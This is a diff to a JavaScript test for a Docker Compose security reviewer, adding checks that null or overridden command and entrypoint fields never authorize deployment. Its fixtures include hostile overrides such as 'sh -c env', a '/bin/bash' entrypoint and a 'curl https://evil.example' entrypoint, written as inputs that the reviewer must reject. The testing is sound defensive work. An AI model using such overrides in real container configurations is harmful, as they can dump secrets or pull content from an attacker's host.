@@ -54,6 +54,26 @@ test('F254 checks canonical resolved Compose model but NEVER authorizes runtime'
     assert.equal(JSON.stringify(r).includes(secret),false);
   const bytes=mutate((_d,s)=>{s.mem_limit=268435456;s.cpus='0.5';});
   assert.equal(review(bytes,opts()).deploymentAuthorized,false);
+  const normalized=mutate((_d,service)=>{
+    service.command=null;
+    service.entrypoint=null;
+  });
+  assert.equal(review(normalized,opts()).deploymentAuthorized,false,
+    'F255 actual Docker Compose normalizes omitted commands to null');
+  for(const change of [
+    service=>{service.command=['sh','-c','env'];},
+    service=>{service.entrypoint=['/bin/bash'];},
+    service=>{service.command='nginx -g daemon off;';},
+    service=>{service.entrypoint='curl https://evil.example';}
+  ]){
+    const malicious=mutate((_d,service)=>{
+      service.command=null;
+      service.entrypoint=null;
+      change(service);
+    });
+    assert.throws(()=>review(malicious,opts()),/F254/,
+      'F255 forbids real command/entrypoint overrides');
+  }
 });
 test('F254 rejects public ports, extra services, host network and elevated container privileges',()=>{
   const attacks=[
